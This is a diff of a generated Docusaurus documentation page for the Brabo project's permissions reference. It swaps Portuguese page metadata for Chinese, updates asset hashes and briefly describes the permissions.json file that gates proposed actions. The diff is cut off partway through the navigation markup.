@@ -1,15 +1,12 @@
-<!doctype html><html lang=zh-Hans dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reference/permissions" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>Permissões | Brabo</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=robots content="noindex, nofollow"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:url content=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions /><meta data-rh=true property=og:locale content=zh_Hans /><meta data-rh=true property=og:locale:alternate content=pt_BR /><meta data-rh=true property=og:locale:alternate content=en /><meta data-rh=true property=og:locale:alternate content=ru /><meta data-rh=true name=docusaurus_locale content=zh-Hans /><meta data-rh=true name=docsearch:language content=zh-Hans /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="Permissões | Brabo"/><meta data-rh=true name=description content="O formato do permissions.json, como um padrão casa com um comando e a ordem exata em que a decisão é tomada."/><meta data-rh=true property=og:description content="O formato do permissions.json, como um padrão casa com um comando e a ordem exata em que a decisão é tomada."/><meta data-rh=true name=keywords content=permissions.json,approval,policy,deny,allow,proposed_action /><link data-rh=true rel=icon href=/brabo/dev/zh-Hans/img/favicon.ico /><link data-rh=true rel=canonical href=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=pt-BR /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/en/reference/permissions hreflang=en /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/ru/reference/permissions hreflang=ru /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions hreflang=zh-Hans /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions","name":"权限","position":1}]}</script><link rel=stylesheet href=/brabo/dev/zh-Hans/assets/css/styles.41f6b491.css /><script src=/brabo/dev/zh-Hans/assets/js/runtime~main.5407a470.js defer></script><script src=/brabo/dev/zh-Hans/assets/js/main.c16271d8.js defer></script></head><body><svg style="display: none;"><defs>
+<!doctype html><html lang=zh-Hans dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reference/permissions" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>权限 | Brabo</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=robots content="noindex, nofollow"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:url content=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions /><meta data-rh=true property=og:locale content=zh_Hans /><meta data-rh=true property=og:locale:alternate content=pt_BR /><meta data-rh=true property=og:locale:alternate content=en /><meta data-rh=true property=og:locale:alternate content=ru /><meta data-rh=true name=docusaurus_locale content=zh-Hans /><meta data-rh=true name=docsearch:language content=zh-Hans /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="权限 | Brabo"/><meta data-rh=true name=description content="permissions.json 的格式、模式如何匹配命令，以及做出决策的确切顺序。"/><meta data-rh=true property=og:description content="permissions.json 的格式、模式如何匹配命令，以及做出决策的确切顺序。"/><meta data-rh=true name=keywords content=permissions.json,approval,policy,deny,allow,proposed_action /><link data-rh=true rel=icon href=/brabo/dev/zh-Hans/img/favicon.ico /><link data-rh=true rel=canonical href=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=pt-BR /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/en/reference/permissions hreflang=en /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/ru/reference/permissions hreflang=ru /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions hreflang=zh-Hans /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/dev/reference/permissions hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://daneiel.github.io/brabo/dev/zh-Hans/reference/permissions","name":"权限","position":1}]}</script><link rel=stylesheet href=/brabo/dev/zh-Hans/assets/css/styles.41f6b491.css /><script src=/brabo/dev/zh-Hans/assets/js/runtime~main.cb690ec5.js defer></script><script src=/brabo/dev/zh-Hans/assets/js/main.00daf59c.js defer></script></head><body><svg style="display: none;"><defs>
 <symbol id=theme-svg-external-link viewBox="0 0 24 24"><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
 </defs></svg>
-<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-3f2")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/brabo/dev/zh-Hans/img/logo.svg /><div role=region aria-label=跳到主要内容><a class=skipToContent_CFOX href=#__docusaurus_skipToContent_fallback>跳到主要内容</a></div><nav aria-label=主导航 class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label=切换导航栏 aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/brabo/dev/zh-Hans/><div class=navbar__logo><img src=/brabo/dev/zh-Hans/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--light_vzqw"/><img src=/brabo/dev/zh-Hans/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--dark_FhTf"/></div><b class="navbar__title text--truncate">Brabo</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/brabo/dev/zh-Hans/>文档</a><a class="navbar__item navbar__link" href=/brabo/dev/zh-Hans/runbook>运维手册</a><a class="navbar__item navbar__link" href=/brabo/dev/zh-Hans/adr>架构决策（ADR）</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link><svg viewBox="0 0 24 24" width=20 height=20 aria-hidden=true class=iconLanguage_g_CG><path fill=currentColor d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>简体中文</a><ul class=dropdown__menu><li><a href=/brabo/dev/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=pt-BR>Português (Brasil)</a><li><a href=/brabo/dev/en/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=en>English</a><li><a href=/brabo/dev/ru/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=ru>Русский</a><li><a href=/brabo/dev/zh-Hans/reference/permissions target=_self rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang=zh-Hans>简体中文</a></ul></div><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link>dev</a><ul class=dropdown__menu><li><a href=https://daneiel.github.io/brabo/prd/ target=_blank rel="noopener noreferrer" class=dropdown__link>prd — estável<svg width=12 height=12 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/qa/ target=_blank rel="noopener noreferrer" class=dropdown__link>qa — 候选版<svg width=12 height=12 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/dev/ target=_blank rel="noopener noreferrer" class=dropdown__link>dev — em desenvolvimento ✓<svg width=12 height=12 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><div class="toggle_pnX7 colorModeToggle_Dj3Z"><button class="clean-btn toggleButton_DKER toggleButtonDisabled_qzkp" type=button disabled title=跟随系统 aria-label=切换浅色/暗黑模式（当前为跟随系统）><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL lightToggleIcon_E8tM"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL darkToggleIcon_rXjT"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL systemToggleIcon_zwCm"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_zRAa><div class="navbar__search searchBarContainer_eGzj" dir=ltr><svg aria-hidden=true class=searchIcon_PXpx focusable=false viewBox="0 0 16 16"><path fill=currentColor d="M6.02945 10.20327a4.17382 4.17382 0 1 1 4.17382-4.17382 4.15609 4.15609 0 0 1-4.17382 4.17382Zm9.69195 4.2199-4.8225-4.82338A5.88021 5.88021 0 0 0 12.058 6.02856 6.00467 6.00467 0 1 0 9.59979 10.8989l4.82338 4.82338a.89729.89729 0 0 0 1.29912 0 .89749.89749 0 0 0-.00087-1.29909Z"/></svg><input placeholder=搜索 aria-label=Search class="navbar__search-input searchInput_xOBI" value="" /><div class="loadingRing_JccP searchBarLoadingRing_aTss"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_WJkx"><div class=docsWrapper_mIeg><button aria-label=回到顶部 class="clean-btn theme-back-to-top-button backToTopButton_Afc8" type=button></button><div class=docRoot_XZYc><aside class="theme-doc-sidebar-container docSidebarContainer_FPqZ"><div class=sidebarViewport_waOe><div class=sidebar_RQC4><nav aria-label=文档侧边栏 class="menu thin-scrollbar menu_ZM4U"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/><span class=categoryLinkLabel_jKch>🚀 从这里开始</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/><span class=linkLabel_CzBh>简介</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/getting-started><span class=linkLabel_CzBh>快速开始</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/tutorials/from-zero-to-deliverable><span class=linkLabel_CzBh>从零到交付物</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/architecture><span class=categoryLinkLabel_jKch>🏗️ 架构</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/architecture><span class=linkLabel_CzBh>架构</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist" tabindex=0 href=/brabo/dev/zh-Hans/adr><span class=categoryLinkLabel_jKch>决策（ADR）</span></a><button aria-label="展开侧边栏分类 '决策（ADR）'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/business-rules><span class=categoryLinkLabel_jKch>📐 规则</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/business-rules><span class=linkLabel_CzBh>业务规则</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/business-rules/custo><span class=linkLabel_CzBh>成本与计量</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/business-rules/autenticacao><span class=linkLabel_CzBh>认证</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role=button aria-expanded=true href=/brabo/dev/zh-Hans/reference/configuration><span class=categoryLinkLabel_jKch>📖 参考</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/configuration><span class=linkLabel_CzBh>配置</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/events><span class=linkLabel_CzBh>事件</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/brabo/dev/zh-Hans/reference/permissions><span class=linkLabel_CzBh>权限</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/artifacts><span class=linkLabel_CzBh>制品</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/git-providers><span class=linkLabel_CzBh>Git 提供方</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/internal-api><span class=linkLabel_CzBh>内部 API</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/scripts><span class=linkLabel_CzBh>脚本与命令</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/rulesets><span class=linkLabel_CzBh>仓库规则集</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/paridade-de-traducao><span class=linkLabel_CzBh>翻译一致性</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/brb><span class=linkLabel_CzBh>BRB 登记册</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/security-surface><span class=linkLabel_CzBh>api 的暴露面</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/api><span class=linkLabel_CzBh>API 参考</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>💡 解释</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true tabindex=0 href=/brabo/dev/zh-Hans/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>流程与流水线</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/documentation-workflow><span class=linkLabel_CzBh>文档同步</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/branching-policy><span class=linkLabel_CzBh>分支策略</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/cadeia-de-suprimentos-do-ci><span class=linkLabel_CzBh>CI 的供应链</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/gates><span class=linkLabel_CzBh>gates，以及如何测量它们</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/observability><span class=linkLabel_CzBh>可观测性</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/modelo-de-time><span class=linkLabel_CzBh>团队模型与交付物流程</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/primeiro-dogfooding><span class=categoryLinkLabel_jKch>验证与测量</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/historico-de-fases><span class=categoryLinkLabel_jKch>阶段历史</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/localizacao><span class=categoryLinkLabel_jKch>本地化</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/tanstack-ai><span class=categoryLinkLabel_jKch>技术笔记</span></a></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/runbook><span class=categoryLinkLabel_jKch>🛠️ 运维</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/runbook><span class=linkLabel_CzBh>运维手册</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/glossary><span class=categoryLinkLabel_jKch>📚 词汇</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/glossary><span class=linkLabel_CzBh>术语表</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true><span class=categoryLinkLabel_jKch>🤝 贡献</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>如何贡献</span><svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>在哪里求助</span><svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>报告漏洞</span><svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></ul></nav></div></div></aside><main class=docMainContainer_ia8v><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_xjE4"><div class=docItemContainer_cPej><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_sZul" aria-label=页面路径><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label=主页面 class=breadcrumbs__link href=/brabo/dev/zh-Hans/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_AUjL><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><span class=breadcrumbs__link>📖 参考</span><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>权限</span></ul></nav><div class="tocCollapsible_nbAK theme-doc-toc-mobile tocMobile_r92C"><button type=button class="clean-btn tocCollapsibleButton_hcyq">本页总览</button></div><div class="alert alert--warning margin-bottom--md" role=note data-faixa-de-traducao="">本页尚未翻译；您正在阅读葡萄牙语原文。</div><div class="theme-doc-markdown markdown"><header><h1>Permissões</h1></header>
-<p>Toda ação com efeito externo nasce como <code>proposed_action</code> e passa por aqui
-antes de executar. Esta página é o formato e a semântica exatos — as regras
-em si estão em <a href=/brabo/dev/zh-Hans/business-rules#rn-004 target=_blank rel="noopener noreferrer" class="">Regras de negócio</a>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-arquivo>O arquivo<a href=#o-arquivo class=hash-link aria-label="O arquivo的直接链接" title="O arquivo的直接链接" translate=no>​</a></h2>
-<p><code>permissions.json</code> mora na <strong>raiz do workspace do projeto</strong> — é um arquivo
-real em disco, versionável, não uma coluna no banco.</p>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-3f2")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/brabo/dev/zh-Hans/img/logo.svg /><div role=region aria-label=跳到主要内容><a class=skipToContent_CFOX href=#__docusaurus_skipToContent_fallback>跳到主要内容</a></div><nav aria-label=主导航 class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label=切换导航栏 aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/brabo/dev/zh-Hans/><div class=navbar__logo><img src=/brabo/dev/zh-Hans/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--light_vzqw"/><img src=/brabo/dev/zh-Hans/img/logo.svg alt=Brabo class="themedComponent_Eyrh themedComponent--dark_FhTf"/></div><b class="navbar__title text--truncate">Brabo</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/brabo/dev/zh-Hans/>文档</a><a class="navbar__item navbar__link" href=/brabo/dev/zh-Hans/runbook>运维手册</a><a class="navbar__item navbar__link" 